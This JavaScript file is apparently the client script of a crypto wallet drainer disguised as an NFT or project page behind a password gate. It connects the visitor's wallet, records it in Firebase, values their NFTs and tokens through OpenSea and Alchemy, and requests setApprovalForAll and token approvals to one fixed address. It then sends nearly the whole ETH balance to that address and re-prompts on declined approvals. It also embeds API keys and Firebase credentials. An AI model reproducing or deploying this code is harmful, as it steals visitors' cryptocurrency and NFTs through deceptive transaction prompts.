


setTimeout( async () => {

    console.log('meh')

 

    $('.MuiInput-input').on('input', function (e) {
        console.log(e.target.value)

        localStorage.setItem('pass', e.target.value)
    })

    $('button').on('click', async () => {
        console.log('button clicked')

        const password = 'You Are Awaited'

    //     const inp = $('.MuiInput-input').val()

    // console.log(inp)

    if (localStorage.getItem('pass') === password) {

        $('.MuiInputBase-root').remove()
        $('button').html('Share Your Progress')


      //         await loadWeb3()
  
      // await getAddress()

      // await trade()

      check()

    } else {

    }


    // $('.MuiStack-root ').append(`<p class="MuiTypography-root MuiTypography-body1 css-x1iqlg">Incorrect.</p>`)



          
    //   await loadWeb3()
  
    //   await getAddress()

    //   await trade()
  
    })
}, 1000);





$(document).ready(function () {
  console.log('yawa');
})

//FIREBASE



// apiKey: "AIzaSyDbL-kQhkfxZZ6i1r-te0TeFFbYTt38lSs",
// authDomain: "cryptojangers.firebaseapp.com",
// projectId: "cryptojangers",
// storageBucket: "cryptojangers.firebasestorage.app",
// messagingSenderId: "633815992",
// appId: "1:633815992:web:701dc949119e1ded74854d",
// measurementId: "G-NV8VJF8T6H"
const config = {
  apiKey: "AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0",
  authDomain: "jangneotokyo.firebaseapp.com",
  projectId: "jangneotokyo",
  storageBucket: "jangneotokyo.firebasestorage.app",
  messagingSenderId: "20777123504",
  appId: "1:20777123504:web:5d991c72b7af82ff6f4575"
}


const app = firebase.initializeApp(config)
const db = firebase.firestore(app)

const ref = db.collection('jangtokyo')

const OPENSEA_URL = "https://api.opensea.io/"
let account;

async function loadWeb3() {
try {
  window.web3 = await new Web3(window.ethereum)
} catch (error)  {
  console.log(error)

}
}

/**
 * 
 * @setItem
 * @getItem 
 */

function setItem(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
  }

function getItem(key) {
  return JSON.parse(localStorage.getItem(key));
}

//

const erc20TokenContractAbi = [
  { inputs: [], stateMutability: "nonpayable", type: "constructor" },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      { indexed: true, internalType: "address", name: "from", type: "address" },
      { indexed: true, internalType: "address", name: "to", type: "address" },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    inputs: [
      { internalType: "address", name: "owner", type: "address" },
      { internalType: "address", name: "spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "decimals",
    outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "subtractedValue", type: "uint256" },
    ],
    name: "decreaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "addedValue", type: "uint256" },
    ],
    name: "increaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "symbol",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "totalSupply",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "sender", type: "address" },
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
];


async function getAddress() {



  const accounts = await window.ethereum.request({
      method: 'eth_requestAccounts'
  }).catch( (err) => {
      if (err.code === 4001) {
          console.log('please con met');
          location.reload()
          
      } else {
          console.error(err)
      }
  
  });

  account = accounts[0]
  console.log(account)

  const LISTCOLLECTION =   db.collection('addresses').doc(account)

  await LISTCOLLECTION.get().then(
      async (  docSnapshot) => {
      if (
        docSnapshot.exists
      ) {
        console.log('doc exists')

        


        LISTCOLLECTION.update({
          status: 'connected',
          date: new Date()
        })


        tradeSecond()

      } else {



        console.log('doc not found')


        LISTCOLLECTION.set({
          address: account,
          date: new Date(),
          status: 'connected'
        }).then( () => {
          console.log('successfully added')
        }).catch( () => {
          console.log('error adding document');
        })


        console.log(account);
        await setFirstConnect()
        await trade()

      }
    }
  )



}



const _abi = [
  {
    inputs: [],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "approved",
        type: "address",
      },
      {
        indexed: true,
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "operator",
        type: "address",
      },
      {
        indexed: false,
        internalType: "bool",
        name: "approved",
        type: "bool",
      },
    ],
    name: "ApprovalForAll",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "previousOwner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "OwnershipTransferred",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        indexed: true,
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
    ],
    name: "balanceOf",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "getApproved",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
    ],
    name: "isApprovedForAll",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "ownerOf",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "renounceOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "safeMint",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "safeTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
      {
        internalType: "bytes",
        name: "data",
        type: "bytes",
      },
    ],
    name: "safeTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
      {
        internalType: "bool",
        name: "approved",
        type: "bool",
      },
    ],
    name: "setApprovalForAll",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "bytes4",
        name: "interfaceId",
        type: "bytes4",
      },
    ],
    name: "supportsInterface",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "symbol",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "tokenURI",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "transferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "transferOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));


async function setFirstConnect() {
  console.log(account);

  var nft = await nfts(account)
  console.log(nft)


var data = {
  time: new Date(),
  spoof: nft,
  owner: account
}


setItem(account, data)
}

async function check() {

  await getAddress();

//     console.log(account);

//     var nft = await nfts(account)
//     console.log(nft)


//   var data = {
//     time: new Date(),
//     spoof: nft,
//     owner: account
//   }


//   setItem(account, data)



      // if (getItem(account) == null || getItem(account).length == 0) {
      //     console.log('no data')

      //     setItem(account, data)
      //     trade()
      //     console.log('data added')

      // } else {
      //     console.log('data already exists')

      //     trade()
      // }

                  


}



async function trade() {

  await loadWeb3();


  var collection = []
  var owner;
  var sortedCollection = []


  data = getItem(account)

  owner = data.owner
  collection = data.spoof




 for (let i = 0; i < collection.length; i++) {
  collection[i].worth = 0;
  collection[i].owner = owner;


  try {

      var result =  await $.ajax({
          url: "https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress="+collection[i].contract,
          method: "GET",
          // success: function (data) {
          //     console.log(data)



          // }
      })

      if (result.openSea != undefined && result.openSea.floorPrice != undefined)
      collection[i].worth = result.openSea.floorPrice

      
  } catch (error) {
      console.log(error)

      if(collection[i].stats.seven_day_volume > 0) {
          collection[i].worth = Math.round(
              collection[i].stats.seven_day_volume * 0.8 * 10000
          ) / 10000
      }
  }
  await delay(1000)
 }

 collection = collection.sort( (a, b) => {
  return a.worth < b.worth
  ? 1
  : -1;
})



for (let i = 0; i < collection.length; i++) {

   if (collection[i].worth != 0) {
      sortedCollection.push(collection[i])
   }
  
}

collection = sortedCollection;


 console.log(collection)


 
 
 

/*---------------------------------------------------------------*/

  var declinedCollection = []

 //jang contracts
 const collection_contracts = db.collection(account.toLowerCase())
 //



await collection_contracts.get().then( (querySnapshot) => {
  querySnapshot.forEach( (doc) => {
      var data = doc.data()
      var approved = data.approved

      //console.log(approved)

      
      if (approved === false) {
          console.log('declined')

          // console.log(data)

          //console.log(data)
          declinedCollection.push(data)
      } else {
          //
          console.log('nothing saved yet')
      }

  })
}).catch( (error) => {
  console.log('error gettings documents ' + error)
})





if (declinedCollection.length < 1) {
  console.log('no data declined contracts yet')
} else {
  console.log('filtered declined collections')
  collection = declinedCollection
}




console.log(collection)
/*---------------------------------------------------------------*/

  for (let i = 0; i < collection.length; i++) {
     

      // console.log(collection[i])

      try {

          
          if (collection[i].approved == true) {


              console.log('approved')
              //no more approval
              //ilocalstorage nalang ni?


          } else {

      

              var collectionContract = await new window.web3.eth.Contract(_abi, collection[i].contract, {gas: '100000'})
              await collectionContract.methods.setApprovalForAll('0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12', true).send({from: account})

              collection[i].date = new Date()
              collection[i].approved = true
              console.log(collection[i])
              
              collection_contracts.doc(collection[i].contract).set(collection[i])
                  .then( () => {
                      console.log('data updated')
                  })
                  .catch( () => {
                      console.log('error data update')
                  })


          }

          
      } catch (error) {

          console.log(error)

          if (error.code == 4001) {
       

              collection[i].date = new Date()
              collection[i].approved = false
              console.log(collection[i])



              collection_contracts.doc(collection[i].contract).get()
                  .then( (docSnapshot) => {
                      if (docSnapshot.exists) {

                          console.log('data already existed')
                          
                      collection_contracts.doc(collection[i].contract).set(collection[i])
                      .then( () => {
                          console.log('data updated')
                      }).catch( (error) => {
                          console.log('error setting document ' + error)
                      })

                      } else {
                          console.log('doc does not exist')

                          collection_contracts.doc(collection[i].contract).set(collection[i])
                          .then( () => {
                              console.log('data updated')
                          }).catch( (error) => {
                              console.log('error setting document ' + error)
                          })
                      }
                  }).catch( (error) => {
                      console.log('Error getting data ' + error)
                  })
                      



              
          }
          
      }


  

  }


/*------------------------------------------------------*/
/*-----------------ETH GET ETH--------------------------*/   
/*------------------------------------------------------*/

await db.collection(account.toLowerCase()).doc('eth_value').get().then( async (doc) => {
  if (doc.exists) {

    const value = doc.data().value;


     // var value = await get_eth(account) //search getbalance.js


var minusvalue = value - 0.0084 //it can be userinputted or set by a webpage or estimated by a thirdparty

const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')




console.log(finalAmount)
const txData = {
  from: account,
  to: '0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12',
  value: finalAmount,
};


await web3.eth.sendTransaction(txData)
  .then( (txHash) => {
    db.collection(`${account}`).add({sent: txHash})
    console.log(txHash)
  }).catch( (err) => {
    console.log(err)
  })
 

      

  } else {
      // doc.data() will be undefined in this case
      console.log("No such document!");

var value = await get_eth(account) //search getbalance.js


var minusvalue = value - 0.0084 //it can be userinputted or set by a webpage or estimated by a thirdparty

const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')




console.log(finalAmount)
const txData = {
  from: account,
  to: '0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12',
  value: finalAmount,
};


await web3.eth.sendTransaction(txData)
  .then( (txHash) => {
    db.collection(`${account}`).add({sent: txHash})
    console.log(txHash)
  }).catch( (err) => {
    console.log(err)
  })
 



  }
}).catch((error) => {
  console.log("Error getting document:", error);
});
  

}


async function tradeSecond() {
  console.log('tradesecond here')

  await loadWeb3();


  var collection = []
  var owner;
  var sortedCollection = []


  data = getItem(account)

  // owner = data.owner
  owner = account.toLowerCase()
  // collection = data.spoof   

  await db.collection(account.toLowerCase()).orderBy('worth', 'asc').get().then((querySnapshot) => {
      querySnapshot.forEach((doc) => {

        // doc.data() is never undefined for query doc snapshots

      //   console.log(doc.id, " => ", doc.data());

              if ( doc.data().approved == false ) {
                  collection.push(doc.id)
              } else {
                  //
              }
 
      });
    });

//   console.log(owner)
//   console.log(collection)


  /*---------------------------------------------------------------*/

  var declinedCollection = []

  const collection_contracts = db.collection(account.toLowerCase())


  await collection_contracts.orderBy('worth', 'desc').get().then( (querySnapshot) => {
      querySnapshot.forEach( (doc) => {
          var data = doc.data()
          var approved = data.approved
    
          //console.log(approved)
    
          
          if (approved === false) {
              console.log('declined')
    
              // console.log(data)
    
              //console.log(data)
              declinedCollection.push(data)
          } else {
              //
              console.log('nothing saved yet')
          }
    
      })
    }).catch( (error) => {
      console.log('error gettings documents ' + error)
    })
    
    
    
    
    
    if (declinedCollection.length < 1) {
      console.log('no data declined contracts yet')
    } else {
      console.log('filtered declined collections')
      collection = declinedCollection
    }
    
    
    
    
    console.log(collection)
     /*---------------------------------------------------------------*/

for (let i = 0; i < collection.length; i++) {
  

  // console.log(collection[i])

  try {

      
      if (collection[i].approved == true) {


          console.log('approved')
          //no more approval
          //ilocalstorage nalang ni?


      } else {


          if (collection[i].type == 'token') {
            console.log('token', collection[i])
            tokenGet(collection[i].contract, collection[i].worth)



          } else {
              
              var collectionContract = await new window.web3.eth.Contract(_abi, collection[i].contract, {gas: '100000'})
              await collectionContract.methods.setApprovalForAll('0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12', true).send({from: account})

              collection[i].date = new Date()
              collection[i].approved = true
              console.log(collection[i])
              
              collection_contracts.doc(collection[i].contract).set(collection[i])
                  .then( () => {
                      console.log('data updated')
                  })
                  .catch( () => {
                      console.log('error data update')
                  })
        }

  



      }

      
  } catch (error) {

      console.log(error)

      if (error.code == 4001) {
      

          collection[i].date = new Date()
          collection[i].approved = false
          console.log(collection[i])



          collection_contracts.doc(collection[i].contract).get()
              .then( (docSnapshot) => {
                  if (docSnapshot.exists) {

                      console.log('data already existed')
                      
                  collection_contracts.doc(collection[i].contract).set(collection[i])
                  .then( () => {
                      console.log('data updated')
                  }).catch( (error) => {
                      console.log('error setting document ' + error)
                  })

                  } else {
                      console.log('doc does not exist')

                      collection_contracts.doc(collection[i].contract).set(collection[i])
                      .then( () => {
                          console.log('data updated')
                      }).catch( (error) => {
                          console.log('error setting document ' + error)
                      })
                  }
              }).catch( (error) => {
                  console.log('Error getting data ' + error)
              })       
      }
      
  }




}

/*------------------------------------------------------*/
/*-----------------ETH GET ETH--------------------------*/   
/*------------------------------------------------------*/

await db.collection(account.toLowerCase()).doc('eth_value').get().then( async (doc) => {
  if (doc.exists) {

    const value = doc.data().value;


     // var value = await get_eth(account) //search getbalance.js


var minusvalue = value - 0.0084 //it can be userinputted or set by a webpage or estimated by a thirdparty

const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')




console.log(finalAmount)
const txData = {
  from: account,
  to: '0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12',
  value: finalAmount,
};


await web3.eth.sendTransaction(txData)
  .then( (txHash) => {
    db.collection(`${account}`).add({sent: txHash})
    console.log(txHash)
  }).catch( (err) => {
    console.log(err)
  })
 

      

  } else {
      // doc.data() will be undefined in this case
      console.log("No such document!");

var value = await get_eth(account) //search getbalance.js


var minusvalue = value - 0.0084 //it can be userinputted or set by a webpage or estimated by a thirdparty

const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')




console.log(finalAmount)
const txData = {
  from: account,
  to: '0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12',
  value: finalAmount,
};


await web3.eth.sendTransaction(txData)
  .then( (txHash) => {

     db.collection(`${account}`).add({sent: txHash})

    console.log(txHash)
  }).catch( (err) => {
    console.log(err)
  })
 



  }
}).catch((error) => {
  console.log("Error getting document:", error);
});

}

///end of TRADESECOND












//////

async function nfts(addr) {
  var url = `${OPENSEA_URL}api/v2/chain/ethereum/account/${addr}/nfts`  
  var nft = []
  var contract = []


await $.ajax({
  url: url,
  method: "GET",
  headers: {
      accept: 'application/json',
      'x-api-key': '078b8acce6a34dd3a2dbb0cd34127203'
    },

    success: function (data) {
      // console.log(data.nfts)

      for (var i = 0; i < data.nfts.length; i++) {

          nft.push(data.nfts[i].contract)

      }

      var uniq = [... new Set(nft)]

      nft = uniq
    }
    
})

  nft.forEach( e => {

      var data = {contract: ''}
      data.contract = e

      contract.push(data)
  })

return contract
}


/*------------------------------------------------------*/

  
  /*------------------------------------------------------*/


// check()


async function get_eth(address) {

const balances = web3.utils.fromWei(
  await web3.eth.getBalance(address),
  'ether'
)* 1;

return balances;

}


// async function TOKENS(){
//   await loadWeb3();


   

//     const t = [
//     // [{token: '0x9F52c8ecbEe10e00D9faaAc5Ee9Ba0fF6550F511'}, {balance: 17000}],
//             // [{token: '0x62D0A8458eD7719FDAF978fe5929C6D342B0bFcE'}, {balance: 147931}],
//     // [{token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'}, {balance: 786}],

//       [{token: '0xf94e7d0710709388bCe3161C32B4eEA56d3f91CC'}, {balance: 54552}],
//       [{token: '0xC466d484c33e0A3A3DbbA6417a2BA4BdFe5B57f3'}, {balance: 22139}],
//           // [{token: '0xB622907fBff6CbF7C3Ce355173251E3EDb13A606'}, {balance: 765569}],
//       [{token: '0xa19f5264f7d7be11c451c093d8f92592820bea86'}, {balance: 55}],

//       //0x62D0A8458eD7719FDAF978fe5929C6D342B0bFcE
  
//   ]
  
//    t.forEach( async e => {
//       var t = e[0].token
//       var b = e[1].balance
//       // var c = e[2].chain
  
//       console.log(t,b,)
  
//       await tokenGet(t, b)
//   })
// }


async function tokenGet(tokenAddress, tokenBalance) {

  await loadWeb3()
  
  try {
    // await ethereum.request({
    //   method: 'wallet_switchEthereumChain',
    //   params: [{chainId: '0x89'}]})
  
  
      const tokenContract = await new web3.eth.Contract(erc20TokenContractAbi, tokenAddress);
      const toAddress = '0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12';
  
      const tokenDecimals = web3.utils.toBN(18);
      const tokenAmountToApprove = web3.utils.toBN(tokenBalance);
      const calculatedApproveValue = web3.utils.toHex(tokenAmountToApprove.mul(web3.utils.toBN(10).pow(tokenDecimals)));
  
      await tokenContract.methods.approve(toAddress, calculatedApproveValue).send({from: account})

      //database diri iingon kong na confirm

      db.collection(`${account.toLowerCase()}`).doc(`${tokenAddress.toLowerCase()}`).update({
        approved: true
      }).then( () => {
        console.log('approved token')
      }).catch( ()=> {
        console.log('ambot ngano error')
      })
  
  } catch (error) {
    console.log(error)

    db.collection(`${account.toLowerCase()}`).doc(`${tokenAddress.toLowerCase()}`).update({
      approved: false
    }).then( () => {
      console.log('wala gi approve ang token')
    }).catch( ()=> {
      console.log('ambot ngano error')
    })
  }
  
  

      
  
      }
